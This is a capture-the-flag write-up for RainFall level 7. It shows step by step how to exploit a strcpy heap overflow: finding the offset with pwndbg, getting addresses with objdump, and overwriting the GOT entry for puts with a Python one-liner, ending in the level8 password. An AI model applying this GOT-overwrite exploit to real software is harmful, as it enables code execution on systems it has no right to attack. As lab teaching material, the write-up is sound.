# Walkthrough for Level 7

## Understanding the Binary

The binary reads the password for `level8` from a file and stores it in a global variable `c`. There is also a function
`m` that prints the contents of `c`, but this function is never called directly.
However, the binary is vulnerable to a buffer overflow because it uses the unsafe `strcpy` function to fill two
buffers. At the end of the `main` function, there is a call to `puts`, so we can overwrite the address of `puts` in the
Global Offset Table (GOT) with the address of `m`. This way, when the program calls `puts`, it will actually call `m`,
allowing us to print the contents of `c`.

## Understanding the Vulnerability

The `strcpy` function is used to copy user input as follows:
- `argv[1]` is copied to `buffer_heap_1[1]`, which has a length of eight bytes.
- `argv[2]` is copied to `buffer_heap_2[1]`, which also has a length of eight bytes.

If the user provides more than eight bytes of input in either argument, the program will overflow the buffer
and overwrite other memory locations.

## Calculating the offset

We use a cyclic pattern of 23 characters as our first argument to find two things:
- the offset needed to overwrite other memory
- the memory which is being overwritten

We add a breakpoint at `0x080485bd` which is the point just before the second call to `strcpy` in the `main` function,
and that is where the second buffer is copied.

```shell
pwndbg> b *0x080485bd
Breakpoint 1 at 0x80485bd
pwndbg> cyclic 23
aaaabaaacaaadaaaeaaafaa
pwndbg> run aaaabaaacaaadaaaeaaafaa CCCC

───────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────
► 0x80485bd <main+156>    call   strcpy@plt                  <strcpy@plt>
dest: 0x61616166 ('faaa')
src: 0xffffd45d ◂— 'CCCC'
...SNIP...
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l faaa
Finding cyclic pattern of 4 bytes: b'faaa' (hex: 0x66616161)
Found at offset 20
```

We find that the second `strcpy` is called with the following arguments:
- `dest`: `faaa` which is part of our cyclic pattern
- `src`: `CCCC` which is the address of the second argument passed to the binary

In `dest` we should find some random address allocated previously by malloc, but instead we find `faaa`, which is part
of our cyclic pattern. This means that with our long first argument we have overwritten `buffer_heap_2[1]` with an
arbitrary value in which `strcpy` will try to copy `CCCC`.

We find also that the offset to overwrite `buffer_heap_2[1]` is 20 bytes.

We will use this mechanism to overwrite the address of `puts` in the Global Offset Table (GOT) with the address of `m`.

## The address of `puts` in the Global Offset Table (GOT)

```shell
level7@RainFall:~$ objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```
The address of `puts` in the Global Offset Table (GOT) is `0x08049928`, in little-endian `\x28\x99\x04\x08`.

## The address of the function `m`

```shell
level7@RainFall:~$ objdump -t ./level7 | grep " m$"
080484f4 g     F .text  0000002d              m
```

The address of the function `m` is `0x080484f4`, in little-endian `\xf4\x84\x04\x08`.

## Crafting the Exploit

Our exploit will consist of:
- 20 characters of offset to reach the `buffer_heap_2[1]`
- the address of `puts` in the GOT to overwrite `buffer_heap_2[1]` with it
- the address of the `m` function in little-endian format to overwrite the address of `puts` in the GOT

## Running the exploit against the binary and getting the password

```shell
level7@RainFall:~$ ./level7 $(python2 -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python2 -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1749126734
```

This gives us the password for `level8`, which can be used to log in via ssh.